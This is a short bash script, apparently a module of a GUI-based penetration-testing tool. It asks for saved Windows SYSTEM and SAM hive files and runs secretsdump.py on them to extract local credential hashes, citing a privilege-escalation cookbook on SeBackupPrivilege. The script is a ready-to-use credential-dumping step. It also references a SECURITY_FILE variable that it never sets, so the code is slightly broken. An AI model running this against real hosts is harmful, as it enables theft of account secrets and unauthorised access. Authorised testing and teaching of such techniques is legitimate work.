#!/bin/bash

: '
Registry: Save SYSTEM, SECURITY, and SAM hives.
'

# https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SYSTEM_FILE_FIELD=$(form_item  "system file" "system_file" "system.save")
SAM_FILE_FIELD=$(form_item  "sam file" "sam_file" "sam.save")

# Generate GUI form
generate_form "${SYSTEM_FILE_FIELD}" "${SAM_FILE_FIELD}"

SYSTEM_FILE=${form_data["system_file"]}
SAM_FILE=${form_data["sam_file"]}

execute_command "secretsdump.py LOCAL -system ${SYSTEM_FILE} -sam ${SAM_FILE} -security ${SECURITY_FILE}"
create_new_line
